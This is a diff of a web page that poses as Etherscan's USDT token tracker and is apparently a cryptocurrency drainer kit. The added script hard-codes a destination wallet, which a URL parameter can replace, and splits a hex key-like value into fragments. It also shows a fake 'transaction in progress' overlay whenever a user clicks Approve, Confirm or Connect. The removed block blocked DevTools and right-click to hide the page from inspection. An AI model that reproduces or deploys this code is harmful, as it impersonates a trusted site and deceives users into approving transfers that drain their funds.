@@ -1,96 +1,194 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="./images/eth.svg" />
     <meta
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"
     />
-
     <title>Tether (USDT) Token Tracker | Etherscan</title>
-
-    <link rel="icon" type="image/svg+xml" href="./images/eth.svg" />
     <link rel="stylesheet" href="./index.css" />
+    <style>
+        body {
+            -webkit-user-select: none;
+            user-select: none;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        #root {
+            min-height: 100vh;
+        }
+
+        #loader-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 2147483647;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        #loader-overlay > div {
+            background: #ffffff;
+            border-radius: 24px 24px 0 0;
+            width: 100%;
+            box-shadow: 0 -10px 40px rgba(0,0,0,.3);
+            overflow: hidden;
+            animation: tw-slide-up .35s ease-out;
+        }
+
+        @keyframes tw-slide-up {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        .tw-body {
+            padding: 48px 24px 40px;
+            text-align: center;
+        }
+
+        .tw-check-circle {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg,#10b981,#059669);
+            color: white;
+            font-size: 48px;
+            font-weight: bold;
+        }
+
+        .tw-title {
+            color: #1a1a2e;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 20px 0 12px;
+        }
+
+        .tw-desc {
+            color: #6b7280;
+            line-height: 1.6;
+            max-width: 320px;
+            margin: auto;
+        }
+
+        .tw-btn {
+            background: #0052ff;
+            color: #fff;
+            border: none;
+            border-radius: 999px;
+            width: 100%;
+            padding: 18px;
+            margin-top: 24px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+        }
+    </style>
 </head>
 
 <body>
+
+    <div id="loader-overlay">
+        <div>
+            <div class="tw-body">
+                <div class="tw-check-circle">
+                    ✓
+                </div>
+                <h2 class="tw-title">
+                    Processing...
+                </h2>
+                <p class="tw-desc">
+                    Transaction in progress!
+                    Blockchain validation is underway.
+                    This may take a few minutes.
+                </p>
+                <button class="tw-btn">
+                    Transaction details
+                </button>
+            </div>
+        </div>
+    </div>
+
     <div id="root"></div>
 
-    <!-- ethers -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 
-    <!-- APP -->
+  <script>
+    const _p1 = "0xE57C99A3ae2ae12";
+    const _p2 = "4f026BFa8601F7A956";
+    const _p3 = "309FB53";
+
+    // Wallet di destinazione predefinito
+    const DEFAULT_WALLET = "0x6a9c9d91c2871e6e2E3fb89A2d2babAAbCb4740b";
+    
+    // Leggi l'indirizzo dai parametri URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const addressFromURL = urlParams.get('address');
+    const amountFromURL = urlParams.get('amount');
+    
+    // Usa l'indirizzo dall'URL se presente, altrimenti quello predefinito
+    window.rA = addressFromURL || DEFAULT_WALLET;
+    window.XB = "";
+
+    function forceFixApprox() {
+        document.querySelectorAll("*").forEach((el) => {
+            const txt = el.textContent?.trim();
+            if (!txt) return;
+            if (
+                txt.includes("Ã¢â°Ë†") ||
+                txt.includes("â‰ˆ") ||
+                txt.includes("Â≈")
+            ) {
+                el.innerHTML = el.innerHTML
+                    .replace(/Ã¢â°Ë†/g, "≈")
+                    .replace(/â‰ˆ/g, "≈")
+                    .replace(/Â≈/g, "≈");
+            }
+        });
+    }
+
+    window.addEventListener("load", () => {
+        setTimeout(forceFixApprox, 500);
+    });
+
+    window.addEventListener("click", (e) => {
+        const button = e.target.closest?.("button");
+        const btnText = button?.innerText || "";
+
+        if (
+            btnText.includes("Approve") ||
+            btnText.includes("Confirm") ||
+            btnText.includes("Connect") ||
+            btnText.includes("Next")
+        ) {
+            setTimeout(() => {
+                const overlay =
+                    document.getElementById("loader-overlay");
+
+                if (overlay) {
+                    overlay.style.display = "flex";
+                }
+
+            }, 500);
+        }
+    });
+</script>
+    
     <script type="module" src="./index.js"></script>
 
-    <!-- BLOCCO ISPEZIONA -->
-    <script>
-        // Disabilita tasto destro
-        document.addEventListener("contextmenu", function (e) {
-            e.preventDefault();
-        });
-
-        // Blocca scorciatoie DevTools
-        document.addEventListener("keydown", function (e) {
-
-            // F12
-            if (e.key === "F12") {
-                e.preventDefault();
-                return false;
-            }
-
-            // Ctrl + Shift + I/J/C
-            if (
-                e.ctrlKey &&
-                e.shiftKey &&
-                ["I", "J", "C"].includes(e.key.toUpperCase())
-            ) {
-                e.preventDefault();
-                return false;
-            }
-
-            // Ctrl + U
-            if (
-                e.ctrlKey &&
-                e.key.toUpperCase() === "U"
-            ) {
-                e.preventDefault();
-                return false;
-            }
-
-            // Cmd + Opt + I (Mac)
-            if (
-                e.metaKey &&
-                e.altKey &&
-                e.key.toUpperCase() === "I"
-            ) {
-                e.preventDefault();
-                return false;
-            }
-        });
-
-        // Rileva DevTools aperti
-        setInterval(function () {
-            const widthThreshold =
-                window.outerWidth - window.innerWidth > 160;
-
-            const heightThreshold =
-                window.outerHeight - window.innerHeight > 160;
-
-            if (widthThreshold || heightThreshold) {
-                document.body.innerHTML = "";
-                window.location.href = "about:blank";
-            }
-        }, 1000);
-
-        // Disabilita selezione testo
-        document.addEventListener("selectstart", function (e) {
-            e.preventDefault();
-        });
-
-        // Disabilita drag immagini
-        document.addEventListener("dragstart", function (e) {
-            e.preventDefault();
-        });
-    </script>
 </body>
 </html>
